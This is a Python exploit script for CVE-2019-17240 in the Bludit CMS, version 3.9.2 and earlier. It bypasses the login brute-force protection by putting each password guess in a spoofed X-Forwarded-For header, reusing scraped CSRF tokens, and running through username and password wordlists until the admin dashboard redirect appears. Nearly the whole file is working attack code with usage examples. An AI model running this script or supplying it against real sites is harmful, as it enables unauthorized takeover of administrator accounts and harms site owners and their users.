#!/usr/bin/python3

# Exploit
## Title: Bludit <= 3.9.2 - Bruteforce Mitigation Bypass
## Author: ColdFusionX (Mayank Deshmukh)
## Author website: https://coldfusionx.github.io
## Date: 2020-10-19
## Vendor Homepage: https://www.bludit.com/
## Software Link: https://github.com/bludit/bludit/archive/3.9.2.tar.gz
## Version: <= 3.9.2

# Vulnerability
## Discoverer: Rastating
## Discoverer website: https://rastating.github.io/
## CVE: CVE-2019-17240 https://nvd.nist.gov/vuln/detail/CVE-2019-17240
## References: https://rastating.github.io/bludit-brute-force-mitigation-bypass/
## Patch: https://github.com/bludit/bludit/pull/1090

'''
Example Usage:
- ./exploit.py -l http://127.0.0.1/admin/login.php -u user.txt -p pass.txt
'''

import requests
import sys
import re
import argparse, textwrap
from pwn import *

#Expected Arguments
parser = argparse.ArgumentParser(description="Bludit <= 3.9.2 Auth Bruteforce Mitigation Bypass", formatter_class=argparse.RawTextHelpFormatter,
epilog=textwrap.dedent('''
Exploit Usage :
./exploit.py -l http://127.0.0.1/admin/login.php -u user.txt -p pass.txt
./exploit.py -l http://127.0.0.1/admin/login.php -u /Directory/user.txt -p /Directory/pass.txt'''))

parser.add_argument("-l","--url", help="Path to Bludit (Example: http://127.0.0.1/admin/login.php)")
parser.add_argument("-u","--userlist", help="Username Dictionary")
parser.add_argument("-p","--passlist", help="Password Dictionary")
args = parser.parse_args()

if len(sys.argv) < 2:
    print (f"Exploit Usage: ./exploit.py -h [help] -l [url] -u [user.txt] -p [pass.txt]")
    sys.exit(1)

# Variable
LoginPage = args.url
Username_list = args.userlist
Password_list = args.passlist

log.info('Bludit Auth BF Mitigation Bypass Script by ColdFusionX \n ')

def login(Username,Password):
    session = requests.session()
    r = session.get(LoginPage)

# Progress Check
    process = log.progress('Brute Force')

#Getting CSRF token value
    CSRF = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="(.*?)"', r.text)
    CSRF = CSRF.group(1)

#Specifying Headers Value
    headerscontent = {
    'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Referer' : f"{LoginPage}",
    'X-Forwarded-For' : f"{Password}"
    }

#POST REQ data
    postreqcontent = {
    'tokenCSRF' : f"{CSRF}",
    'username' : f"{Username}",
    'password' : f"{Password}"
    }

#Sending POST REQ
    r = session.post(LoginPage, data = postreqcontent, headers = headerscontent, allow_redirects= False)

#Printing Username:Password
    process.status('Testing -> {U}:{P}'.format(U = Username, P = Password))

#Conditional loops
    if 'Location' in r.headers:
        if "/admin/dashboard" in r.headers['Location']:
            print()
            log.info(f'SUCCESS !!')
            log.success(f"Use Credential -> {Username}:{Password}")
            sys.exit(0)
    elif "has been blocked" in r.text:
        log.failure(f"{Password} - Word BLOCKED")

#Reading User.txt & Pass.txt files
userfile = open(Username_list).readlines()
for Username in userfile:
    Username = Username.strip()

passfile = open(Password_list).readlines()
for Password in passfile:
    Password = Password.strip()
    login(Username,Password)